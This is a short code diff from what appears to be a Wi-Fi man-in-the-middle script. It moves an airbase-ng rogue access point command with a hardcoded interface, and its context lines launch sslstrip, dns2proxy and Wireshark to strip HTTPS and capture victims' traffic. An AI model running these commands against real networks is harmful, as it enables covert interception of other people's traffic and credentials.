@@ -42,6 +42,8 @@ print("[I] Restarting NetworkManager...")
 os.system("sudo service network-manager restart")
 os.system("sudo ifconfig " + ap_iface + " up")
 
+os.system("sudo screen -S mitmap-airbase -m -d airbase-ng -P wlan1mon")
+
 #SSLSTRIP QUESTION
 sslstrip_if = input("[?] Use SSLSTRIP 2.0? Y/n: ")
 sslstrip_if = sslstrip_if.lower()
@@ -187,7 +189,7 @@ if sslstrip_if == "y" or sslstrip_if == "":
     os.system("sudo screen -S mitmap-sslstrip -m -d python " + script_path + "src/sslstrip2/sslstrip.py -l 9000 -w " + script_path + "logs/mitmap-sslstrip.log -a")
     os.system("sudo screen -S mitmap-dns2proxy -m -d sh -c 'cd " + script_path + "src/dns2proxy && python dns2proxy.py'")
     time.sleep(5)
-    os.system("sudo screen -S mitmap-airbase -m -d airbase-ng -P " + ap_iface)
+
     if wireshark_if == "y" or wireshark_if == "":
         print("[I] Starting WIRESHARK...")
         os.system("sudo screen -S mitmap-wireshark -m -d wireshark -i " + ap_iface + " -k -w " + script_path + "logs/mitmap-wireshark.pcap")
